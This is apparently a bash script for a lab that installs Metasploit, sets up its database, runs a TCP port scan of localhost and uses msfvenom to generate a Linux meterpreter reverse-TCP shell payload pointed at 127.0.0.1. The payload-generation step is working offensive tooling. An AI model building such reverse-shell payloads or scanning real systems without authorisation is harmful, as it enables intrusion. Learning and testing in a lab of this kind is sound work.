#!/bin/bash

# metasploit_workflow.sh
# Automate Metasploit setup and tasks (for educational use only)

set -e

echo "[*] Installing dependencies..."
sudo apt update && sudo apt install -y postgresql metasploit-framework

echo "[*] Starting PostgreSQL service..."
sudo systemctl enable postgresql
sudo systemctl start postgresql

echo "[*] Creating PostgreSQL user and database for Metasploit..."
sudo -u postgres createuser msf -P --interactive
sudo -u postgres createdb -O msf msf_database

echo "[*] Initializing Metasploit DB..."
msfdb init

echo "[*] Verifying Metasploit DB connection..."
msfconsole -q -x "db_status; exit"

echo "[*] Creating payload with msfvenom..."
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > payload.elf
chmod +x payload.elf
echo "[*] Payload saved as payload.elf"

echo "[*] Starting Metasploit for auxiliary scan..."
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 127.0.0.1; set THREADS 10; run; notes add -t scan -n 'Localhost scanned'; loot -t csv; exit"

echo "[*] Done. Check notes.csv and loot directory."
